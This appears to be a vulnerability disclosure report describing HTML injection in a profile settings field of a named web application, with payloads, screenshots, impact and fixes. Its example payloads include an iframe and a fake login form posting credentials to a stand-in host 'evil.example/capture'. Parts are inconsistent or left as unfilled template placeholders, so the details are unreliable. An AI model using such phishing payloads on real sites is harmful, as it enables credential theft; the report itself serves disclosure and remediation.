## Title

HTML Injection via name parameter on editing public profile 

## Vulnerability Type

HTML Injection

## Summary

Git Lab https://admin-code.kzlabs.in/index.php?view=settings Full name is vulnerable to HTML injection.
The website reflects user input from the search parameter without proper sanitisation/encoding, which allows an attacker to inject arbitrary HTML markup that is rendered in the victim's browser when the victim visits a malicious URL. This can be used to alter page content, inject fake forms, or redirect/deceive users (e.g. phishing).

## Vulnerable Endpoint

https://admin-code.kzlabs.in/index.php?view=settings

## Steps to Reproduce

1. Navigate to the following URL: `https://admin-code.kzlabs.in/index.php?view=settings`
2. Observe that the injected HTML is rendered on the page (e.g. injected heading, image, or form appears where the input is reflected)

## Payload used

`<a href="https://bing.com">Click me</a>`

(Other useful payloads to demonstrate impact: `<img src=x>`, `<iframe src="https://evil.example"></iframe>`, `<form action="https://evil.example/capture"><input name="username"><input type="password" name="password"><input type="submit"></form>`)

## Proof of Concept Request

`Screenshot 1: Screenshot shows payload in vulnerable [field/parameter name]`

<img width="1792" height="1090" alt="image" src="https://github.com/user-attachments/assets/adcd3333-7ffd-4fe1-a623-d5984aad77c5" />


`Screenshot 2: Screenshot shows the injected HTML rendered on the page`

<img width="1792" height="1120" alt="image" src="https://github.com/user-attachments/assets/a700b3af-ea45-4bc7-b841-9ae10b4c5674" />


## Impact

An attacker can perform the following actions using this vulnerability:

- It allows attackers to alter the visual appearance and content of the page
- It can be used to inject fake login forms to phish user credentials
- It can be used to embed malicious or misleading links/iframes
- It can damage the credibility/trust of the application in the eyes of the victim
- Depending on context, it may act as a stepping stone toward stored/reflected XSS if input filtering is inconsistent

## Recommendations for fix

Validate and sanitise the [parameter name] parameter to ensure it does not contain any malicious HTML content. This can be done by:

1. Encode all user-controlled output before rendering it in HTML context (e.g. use `htmlspecialchars()` in PHP, or an equivalent output-encoding function in the relevant language/framework)
2. Apply a strict allow-list for any HTML tags/attributes that are genuinely required (e.g. via a sanitisation library such as DOMPurify), rather than a deny-list
3. Set a strong Content-Security-Policy (CSP) header to reduce the impact of any injected markup
4. Avoid directly concatenating user input into HTML templates; use templating engines with automatic contextual escaping
5. Use a WAF (e.g. Cloudflare) as a defence-in-depth measure to catch common injection payloads before they reach the server
